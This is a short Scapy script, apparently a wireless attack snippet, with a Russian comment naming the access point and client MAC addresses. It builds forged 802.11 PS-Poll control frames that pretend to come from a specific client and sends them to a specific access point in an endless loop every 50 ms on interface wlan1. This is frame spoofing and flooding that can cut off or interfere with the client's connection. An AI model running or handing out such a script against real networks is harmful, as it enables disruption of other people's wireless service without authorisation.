from scapy.all import *

frame = RadioTap() /Dot11FCS(type=1,
                             subtype=10, 
                             addr1='50:ff:20:6a:e5:a8', 
                             addr2='28:c2:1f:33:ba:95')
sendp(frame, iface='wlan1', inter=0.050, loop=1)

#Здесь addr1 – MAC-адрес точки доступа, addr2 – MAC-адрес клиента.